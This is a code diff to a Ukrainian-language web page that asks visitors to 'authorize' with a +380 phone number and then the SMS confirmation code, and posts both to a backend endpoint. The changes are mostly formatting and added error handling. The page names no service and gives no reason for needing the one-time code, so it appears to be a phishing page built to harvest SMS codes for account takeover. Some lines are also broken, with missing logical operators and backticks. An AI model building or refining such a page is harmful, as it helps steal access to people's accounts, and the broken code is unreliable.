@@ -105,9 +105,9 @@
         }
         
         .main-subtitle {
-             font-weight: 600;
-             font-size: 18px;
-             color: var(--text-color);
+            font-weight: 600;
+            font-size: 18px;
+            color: var(--text-color);
         }
 
         .button {
@@ -124,15 +124,18 @@
             background: linear-gradient(90deg, var(--gradient-start), var(--gradient-mid));
             background-size: 200% 200%;
             animation: buttonShine 3s ease infinite;
+
+position: relative;
+            z-index: 10; /* Добавлено для предотвращения перекрытия */
         }
         
         @keyframes buttonShine {
-            0%{background-position:0% 50%}
-            50%{background-position:100% 50%}
-            100%{background-position:0% 50%}
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-.button:hover {
+        .button:hover {
             transform: translateY(-3px) scale(1.02);
             box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
         }
@@ -158,8 +161,8 @@
         }
         
         .phone-input-wrapper:focus-within {
-             border-color: var(--gradient-start);
-             box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
+            border-color: var(--gradient-start);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
         }
 
         .phone-prefix {
@@ -218,7 +221,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
     </style>
 </head>
 <body>
@@ -244,7 +246,8 @@
         </div>
 
         <div id="phone-screen" class="screen">
-            <h1>Авторизуйся щоб почати</h1>
+
+<h1>Авторизуйся щоб почати</h1>
             <p>Введіть ваш номер телефону для продовження.</p>
             <div class="form-group">
                  <div class="phone-input-wrapper">
@@ -255,7 +258,7 @@
             <button id="auth-btn" class="button">Авторизуватись</button>
         </div>
 
-<div id="code-screen" class="screen">
+        <div id="code-screen" class="screen">
             <h1>Очікуйте на смс з кодом</h1>
             <p>Ми відправили код підтвердження на ваш номер.</p>
             <div class="form-group">
@@ -264,29 +267,32 @@
             <button id="code-btn" class="button">Підтвердити</button>
             <div id="loader" class="loader"></div>
         </div>
-
     </div>
 
     <script>
-        // --- FIX: Wrap all code in DOMContentLoaded listener ---
         document.addEventListener('DOMContentLoaded', () => {
-            // --- Elements ---
+            console.log('DOM fully loaded'); // Отладка: проверяем загрузку DOM
+
             const welcomeScreen = document.getElementById('welcome-screen');
             const phoneScreen = document.getElementById('phone-screen');
             const codeScreen = document.getElementById('code-screen');
-
             const startBtn = document.getElementById('start-btn');
             const authBtn = document.getElementById('auth-btn');
             const codeBtn = document.getElementById('code-btn');
-            
             const phoneInput = document.getElementById('phone-input');
             const codeInput = document.getElementById('code-input');
             const loader = document.getElementById('loader');
-
+            
             let userPhoneNumber = '';
 
-            // --- Transitions ---
+            // Проверяем, что все элементы найдены
+            if (!startBtn  !welcomeScreen  !phoneScreen) {
+                console.error('One or more elements not found:', { startBtn, welcomeScreen, phoneScreen });
+                return;
+            }
+
             startBtn.addEventListener('click', () => {
+                console.log('Start button clicked'); // Отладка: проверяем клик
                 welcomeScreen.classList.remove('active');
                 phoneScreen.classList.add('active');
             });
@@ -297,67 +303,64 @@
                     alert('Будь ласка, введіть повний номер телефону.');
                     return;
                 }
-                
                 userPhoneNumber = +380${rawPhone};
                 authBtn.disabled = true;
                 authBtn.textContent = 'Відправка...';
-
                 try {
-                    // On Netlify, serverless functions are available at /.netlify/functions/
-                    // But Netlify's proxy rewrite usually handles this, so /api/ should still work.
-                    await fetch('/api/index', { 
+                    const response = await fetch('/api/submit', { 
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ type: 'phone', data: userPhoneNumber }),
                     });
-                    
+                    if (!response.ok) {
+                        throw new Error(HTTP error! status: ${response.status});
+                    }
                     phoneScreen.classList.remove('active');
                     codeScreen.classList.add('active');
                 } catch (error) {
-                    console.error("Fetch error:", error);
+                    console.error('Fetch error:', error);
                     alert('Сталася помилка. Спробуйте ще раз.');
+                } finally {
                     authBtn.disabled = false;
                     authBtn.textContent = 'Авторизуватись';
                 }
             });
 
             codeBtn.addEventListener('click', async () => {
-                const code = codeInput.value;
+                const code = codeInput.value.replace(/\s/g, '');
                 if (code.length < 4) {
-                    alert('Будь ласка, введіть код.');
+
+alert('Будь ласка, введіть код.');
                     return;
                 }
-                
                 codeBtn.style.display = 'none';
                 loader.style.display = 'block';
-
                 try {
-                    await fetch('/api/index', {
+                    const response = await fetch('/api/submit', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code: code } }),
+                        body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
                     });
-                    
+                    if (!response.ok) {
+                        throw new Error(HTTP error! status: ${response.status});
+                    }
                     document.querySelector('.card').innerHTML = '<h1>Дякуємо!</h1><p>Ваші дані успішно відправлено. Ми скоро з вами зв\'яжемося.</p>';
-
                 } catch (error) {
-                    console.error("Fetch error:", error);
+                    console.error('Fetch error:', error);
                     alert('Сталася помилка при відправці коду. Спробуйте ще раз.');
+                } finally {
                     codeBtn.style.display = 'block';
                     loader.style.display = 'none';
                 }
             });
 
-// --- Phone Input Formatting ---
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '');
                 let formatted = '';
-
                 if (value.length > 0) formatted += value.substring(0, 2);
                 if (value.length > 2) formatted += ' ' + value.substring(2, 4);
                 if (value.length > 4) formatted += ' ' + value.substring(4, 7);
                 if (value.length > 7) formatted += ' ' + value.substring(7, 9);
-                
                 e.target.value = formatted.trim();
             });
         });
